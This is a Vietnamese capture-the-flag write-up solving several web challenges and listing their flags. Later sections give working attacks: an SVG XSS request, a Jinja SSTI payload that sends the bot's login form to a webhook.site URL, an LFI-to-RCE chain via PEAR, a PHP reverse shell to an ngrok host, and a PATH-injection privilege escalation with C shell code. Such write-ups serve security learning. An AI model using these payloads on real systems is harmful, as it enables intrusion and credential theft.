## [10] catch me if you can

view source code sẽ tìm ra flag 

## [20] Celeste Speedrunning Association
Score cao nhất là 0, thử đưa một số rất lớn vào sẽ khiến nó tràn số về số âm (có vẻ code bằng JAVA)
```
start=168261534697465165489498497498
```

```
you win the flag: actf{wait_until_farewell_speedrun}
```

## [40] shortcircuit
Hàm chunk sẽ split flag ra thành mảng 4 phần tử, mỗi phần tử 30 character long, sau đó dùng swap hoán đổi vị trí 4 phần tử này, gọi swap 2 lần trên mảng trên thì mảng sẽ về vị trí ban đầu, join lại ta sẽ có flag

```
swap(swap(chunk("7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7", 30))).join("")
```

```
actf{cl1ent_s1de_sucks_544e67e6317199e454f4d2bdb04d9e419ccc7f12024523398ee02fe7517fffa92517e08250c4aaa9ed206fd7c9e398e2}
```

## [40] directory
Flag nằm ở một trong số cái file đó, bruteforce đến file 3054 sẽ thấy flag

https://directory.web.actf.co/3054.html
```
actf{y0u_f0und_me_b51d0cde76739fa3}
```

## [40] Celeste Tunneling Association
Theo code ta chỉ cần đưa giá trị `flag.local` vào header Host là sẽ có flag

```
actf{reaching_the_core__chapter_8}
```

## [80] hallmark
Goal là XSS để lấy flag từ cookie của con bot, nhưng cách thông thường thì ta sẽ không thể lấy được content type `image/svg+xml` nhằm đưa một file svg chứa javascript vào

Tuy nhiên tại route PUT, ta có thể update card, với logic xử lý bên dưới ta có thể update để card trả về `image/svg+xml` bằng lỗi type confusion
```
cards[id].type = type == "image/svg+xml" ? type : "text/plain";
    cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;
```
Request:
```http 
PUT /card HTTP/1.1
Host: hallmark.web.actf.co
Content-Length: 1202
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://hallmark.web.actf.co
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hallmark.web.actf.co/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

svg=text&content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%73%74%61%6e%64%61%6c%6f%6e%65%3d%22%6e%6f%22%3f%3e%0a%3c%21%44%4f%43%54%59%50%45%20%73%76%67%20%50%55%42%4c%49%43%20%22%2d%2f%2f%57%33%43%2f%2f%44%54%44%20%53%56%47%20%31%2e%31%2f%2f%45%4e%22%20%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%47%72%61%70%68%69%63%73%2f%53%56%47%2f%31%2e%31%2f%44%54%44%2f%73%76%67%31%31%2e%64%74%64%22%3e%0a%0a%3c%73%76%67%20%76%65%72%73%69%6f%6e%3d%22%31%2e%31%22%20%62%61%73%65%50%72%6f%66%69%6c%65%3d%22%66%75%6c%6c%22%20%78%6d%6c%6e%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%30%2f%73%76%67%22%3e%0a%20%20%3c%70%6f%6c%79%67%6f%6e%20%69%64%3d%22%74%72%69%61%6e%67%6c%65%22%20%70%6f%69%6e%74%73%3d%22%30%2c%30%20%30%2c%35%30%20%35%30%2c%30%22%20%66%69%6c%6c%3d%22%23%30%30%39%39%30%30%22%20%73%74%72%6f%6b%65%3d%22%23%30%30%34%34%30%30%22%2f%3e%0a%20%20%3c%73%63%72%69%70%74%20%74%79%70%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%3e%0a%20%20%20%20%61%6c%65%72%74%28%22%58%53%53%20%62%79%20%42%48%41%52%41%54%22%29%3b%0a%20%20%3c%2f%73%63%72%69%70%74%3e%0a%3c%2f%73%76%67%3e&id=2c05d443-a964-44b6-8d9f-6b91bbfdb41b&type[]=image/svg%2bxml
```
Ta sẽ craft được một link thực thi được JS, gửi link này đến bot và lấy flag
https://hallmark.web.actf.co/card?id=2c05d443-a964-44b6-8d9f-6b91bbfdb41b

## [110] brokenlogin
Ứng dụng chạy flask, nhìn vào đoạn sau ta có thể thấy lỗi SSTI
```
render_template_string(indexPage % custom_message, fails=fails)
```
`custom_message` là data lấy từ `request.args["message"]`, được đưa trực tiếp vào `render_template_string`, nhưng vấn đề flag không nằm ở đây là flag nằm ở password của con bot, nên có vẻ đây vẫn là challenge client side

Mặc định thì template engine sẽ escape html của tất cả output, ta không thể chèn tag html gì, nhưng vì ta có thể dùng template markup, jinja (flask mặc định sài jinja) có một keyword là safe để đánh dấu là output này safe và không cần escape, ta có thể dùng keyword này để chèn HTML vào và từ đó lead tới XSS

Nhưng để ý nếu payload dài quá 25 ký tự nó sẽ không nối input vào `render_template_string` nữa nên ta sẽ dùng 1 trick nhỏ

`{{request.args.a|safe}}`

```
https://brokenlogin.web.actf.co/?message={{request.args.a|safe}}&a=%3Cscript%3Ealert(%27a%27)%3C/script%3E
```
Ta sẽ lấy input từ một parameter khác là `a` thì ta sẽ bypass qua được length restriction

Tiếp theo ta sẽ dùng JS để thay đổi `action` của form để khi con bot submit thì nó sẽ gửi đến url của ta 
```
https://brokenlogin.web.actf.co/?message={{request.args.a|safe}}&a=%3Cscript%3Edocument.body.onload%20=%20()%20=%3E%20document.getElementsByTagName(%27form%27)[0].action%20=%20%22https://webhook.site/68a40976-d351-4dde-a022-b23547e4cc1c%22%3C/script%3E
```
webhook:
```
username=admin&password=actf%7Badm1n_st1ll_c4nt_l0g1n_11dbb6af58965de9%7D
```

## [180] filestore
Cái upload file thật ra để đánh lạc hướng đó ae, bài này gồm 2 giai đoạn, giai đoạn from LFI to RCE và leo quyền để đọc flag.

Về LFI to RCE, đọc source ta sẽ thấy nếu có param `f` thì nó sẽ `include "./uploads/" . $_GET["f"];` => Path traversal, nhưng vấn đề là include cái gì đây, đọc file thì ok nhưng mà cũng không thể đọc flag, cái flag đã bị set permission để chỉ cho admin đọc, mình là user `ctf` không đọc được. Ta sẽ đến với PEAR, PEAR (PHP Extension and Application Repository) là một framework của PHP, liên tưởng nó giống như NPM bên NodeJS, nó hỗ trợ coder tái sử dụng các class có sẵn của PHP (xử lý cache, DB, ...) để tiết kiệm thời gian khi dev. Bản thân nó là một CLI program, nhưng nếu PHP config set `register_argc_argv` thì pear sẽ có thể nhận các REQUEST paramater thay cho CLI argument, và PEAR thì gần như luôn tích hợp sẵn trong PHP

http://man.he.net/man1/pecl

Như ta thấy với option `config-create`, ta có thể tạo ra một config file, với việc có thể truyền tham số cho program thông qua các parameter, ta có thể write được một con Shell lên server và từ đó RCE
```
config-create  Create a Default configuration file
```
Với điều kiện ta tìm được 1 thư mục mà ta có quyền write, cùng với đó là config `register_argc_argv` được set là true. Với PHP docker image thì config `register_argc_argv` luôn được set, và theo như file docker thì permission của folder `www` bị đổi, ta không có quyền write vào nó, ta sẽ dùng thư mục `tmp`, write shell vào đây rồi dùng path traversal include file PHP đó 
![](https://i.imgur.com/pkIRLQX.png)

![](https://i.imgur.com/KoaL5Qo.png)

Giờ dùng PHP để lấy reverse shell
```http
GET /?f=../../../../tmp/shin24.php&c=php+-r+'$sock=fsockopen("0.tcp.ap.ngrok.io",10968);$proc=proc_open("/bin/sh+-i",+array(0=>$sock,+1=>$sock,+2=>$sock),$pipes);' HTTP/1.1
Host: filestore.web.actf.co
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


```

Giờ ta cat flag thôi nhở

![](https://i.imgur.com/HAgt4Bh.png)

Làm gì dễ thế =))), đây là state 2, ta sẽ phải priv esc để đọc được flag, check owner thấy flag.txt là của admin, vậy ta phải nâng quyền mình lên admin, trong các file mà ta được đưa có 2 file SUID binary, lúc đầu thì mình cũng khá confuse, để đỡ dài dòng thì mình sẽ nói luôn là ta cần chú ý vào file `list_uploads`, đưa vào IDA và f5 lên ta sẽ thấy nó đang gọi đến binary `ls`
![](https://i.imgur.com/5L8QjUR.png)

Nhưng mà lưu ý là ở đây nó gọi đến ls, chứ không phải `/bin/ls`, vậy thì ta có thể dùng PATH injection, tạo một file tên `ls` ở một folder nào đó (`tmp` đi) rồi chạy lại SUID kia, file `ls` sẽ là một file để spawn shell. Nội dung file `ls` của mình (thật ra là của robbert viết, pao thủ thế giới)
```c 
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar(10); \
};

int main(){
    setuid(999);
    if(getuid()!=999){
        puts("chiu");
        exit(-1);
    }
    execve("/bin/sh",NULL,NULL);
}
```

Đưa file này lên server và compile (hoặc compile rồi đưa lên server, nhớ là zip lại để không bị mất execute permission) rồi chạy file `list_uploads` ta sẽ spawn được shell với quyền admin, giờ thì cat flag thôi
